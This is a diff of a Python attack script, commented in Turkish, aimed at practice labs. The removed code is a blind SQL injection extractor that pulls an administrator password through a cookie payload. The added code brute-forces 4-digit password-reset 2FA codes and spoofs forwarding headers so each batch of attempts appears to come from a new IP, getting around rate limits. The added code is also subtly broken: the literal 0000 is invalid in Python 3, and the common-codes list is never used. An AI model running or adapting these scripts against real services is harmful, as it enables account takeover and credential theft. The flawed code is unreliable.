@@ -1,83 +1,110 @@
 import requests
-import string
 import time
+from itertools import cycle
+import random
 
-# --- AYARLAR ---
-# Bu kısma kendi labınızın url adresini gir
-target_url = "https://0a2e007903c33f3580ef3f56002000b3.web-security-academy.net/"
+def ip_degistirici():
+    """Farklı IP'ler oluştur (private IP aralığında)"""
+    return f"10.114.{random.randint(1,254)}.{random.randint(1,254)}"
 
-# Tarayıcıdan aldığın GÜNCEL Cookie değerlerini buraya gir.
-# 'TrackingId' kısmının SADECE orijinal ID'sini buraya yaz.
-tracking_id_base = "ZJPZP13tje9pVph4" 
-# bu değer labdaki diğer cookie değeridir kendi lab session cookie değerinizi giriniz.
-session_id = "MlmR5LeCSrHkY3SbbKJdWbLbKeLNPs1o"
-
-# Buradaki bilgileri kendi labınıza göre değiştirmelisiniz
-# f12 tuşuna bastıktan sonara network sekmesine tıklayıp sayfayı yeniletin
-# burada filter?category=..... benzer bir istek olacak oraya tıklayıp aşağıdaki 
-# başlıkları bulup oradaki bilgileri buradaki karşılıklarına ekleyin 
-headers = {
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate, br",
-}
-
-# 1. Liste: 1-20 arası sayılar
-positions = range(1, 21)
-# 2. Liste: a-z ve 0-9
-characters = string.ascii_lowercase + string.digits 
-
-# Sonuçları tutacağımız liste
-results = []
-
-print(f"Toplam {len(positions) * len(characters)} istek gönderilecek. Başlıyor...")
-
-# --- DÖNGÜLER ---
-for pos in positions:
-    for char in characters:
+def iki_faktor_bruteforce():
+    url = "http://10.114.136.174:1337/reset_password.php"
+    email = "tester@hammer.thm"
+    
+    # Denenecek 2FA kodları (0000-9999 arası)
+    # Hızlı test için küçük aralık, gerçekte range(10000) kullan
+    kodlar = range(10000)  # 0000'den 9999'a
+    
+    deneme_sayisi = 0
+    max_deneme = 7
+    
+    for kod in kodlar:
+        # 7 denemede bir IP değiştir
+        if deneme_sayisi >= max_deneme:
+            print(f"\n[+] 7 deneme tamamlandı, IP değiştiriliyor...")
+            deneme_sayisi = 0
+            time.sleep(1)  # IP değişimi için bekle
         
-        # Senin belirlediğin SQL Payload yapısı
-        # $1$ yerine {pos}, $y$ yerine {char} geliyor.
-        payload = f"' and (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username = 'administrator') = '{char}'--"
+        # Yeni IP oluştur (ilk deneme veya IP değişimi gerekiyorsa)
+        if deneme_sayisi == 0:
+            current_ip = ip_degistirici()
+            print(f"\n[+] Yeni IP kullanılıyor: {current_ip}")
         
-        # Cookie'yi oluşturuyoruz
-        cookies = {
-            "TrackingId": tracking_id_base + payload,
-            "session": session_id
+        # İstek başlıkları
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'X-Forwarded-For': current_ip,
+            'Client-IP': current_ip,
+            'X-Real-IP': current_ip,
+            'Content-Type': 'application/x-www-form-urlencoded'
         }
-
+        
+        # POST verileri
+        data = {
+            'email': email,
+            '2fa_code': f"{kod:04d}"  # 4 haneli kod
+        }
+        
         try:
-            # İsteği gönder
-            response = requests.get(target_url, headers=headers, cookies=cookies)
+            print(f"[*] Deneniyor: {kod:04d} (IP: {current_ip})", end='\r')
             
-            # Yanıt uzunluğunu al
-            length = len(response.content)
+            response = requests.post(url, data=data, headers=headers, timeout=3)
+            deneme_sayisi += 1
+            print(f"status code: {response.status_code}//")
+            # Başarılı kodu bulduk mu kontrol et
+            if "Invalid or expired recovery code!" not in response.text:
+                
+                print(f"\n\n[!!!] BAŞARILI! Kod bulundu: {kod:04d}")
+                print(f"[!!!] Sunucu yanıtı: {response.text[:200]}")
+                    
+                    # Başarılı kodu dosyaya kaydet
+                with open('bulunan_kod.txt', 'w') as f:
+                    f.write(f"2FA Kodu: {kod:04d}\n")
+                    f.write(f"IP: {current_ip}\n")
+                    f.write(f"Yanıt: {response.text}")
+                    
+                return kod
+
             
-            # Sonucu listeye ekle
-            results.append({
-                "pos": pos,
-                "char": char,
-                "length": length,
-                "status": response.status_code
-            })
+        except requests.exceptions.RequestException as e:
+            print(f"\n[!] Hata: {e}")
+            time.sleep(2)
+            continue
+
+    print("\n[!] Kod bulunamadı!")
+    return None
+
+def akilli_bruteforce():
+    """Daha akıllı brute force - önce yaygın kodları dene"""
+    
+    # Önce en yaygın 2FA kodları
+    yaygin_kodlar = [
+        1234, 0000, 1111, 2222, 3333, 4444, 5555, 6666, 7777, 8888, 9999,
+        1122, 1212, 1230, 1231, 1232, 1233, 1235
+    ]
+    
+    print("[+] Yaygın kodlar taranıyor...")
+    sonuc = iki_faktor_bruteforce()
+    
+    if sonuc:
+        return sonuc
+    
+    print("[+] Yaygın kodlar bulunamadı, tüm kombinasyonlar taranıyor...")
+    return iki_faktor_bruteforce()
+
+if __name__ == "__main__":
+    print("=== 2FA Brute Force Aracı ===")
+    print("Hedef: http://10.114.136.174:1337/reset_password.php")
+    print("Email: tester@hammer.thm")
+    print("=" * 40)
+    
+    try:
+        bulunan_kod = akilli_bruteforce()
+        
+        if bulunan_kod is not None:
+            print(f"\n✅ 2FA Kodu: {bulunan_kod:04d}")
+        else:
+            print("\n❌ Kod bulunamadı!")
             
-            # Ekrana bilgi bas (yan yana yazsın diye end='\r' kullandım)
-            print(f"İstek yollandı: Pozisyon {pos} - Karakter {char} - Uzunluk: {length}", end='\r')
-            
-        except Exception as e:
-            print(f"\nHata oluştu: {e}")
-
-print("\n\n--- Tüm İstekler Tamamlandı. Sıralanıyor... ---\n")
-
-# --- SIRALAMA ---
-# Yanıt uzunluğuna (length) göre BÜYÜKTEN KÜÇÜĞE (reverse=True) sıralar.
-# Farklı olan (doğru olan) genellikle en üstte veya en altta çıkar.
-sorted_results = sorted(results, key=lambda x: x['length'], reverse=True)
-
-print(f"{'POZİSYON':<10} {'KARAKTER':<10} {'UZUNLUK':<10} {'STATUS'}")
-print("-" * 50)
-
-for res in sorted_results:
-    # Tüm sonuçları döküyoruz, en üsttekiler muhtemelen doğru şifre parçalarıdır.
-    print(f"{res['pos']:<10} {res['char']:<10} {res['length']:<10} {res['status']}")
+    except KeyboardInterrupt:
+        print("\n\n[!] Kullanıcı tarafından durduruldu.")
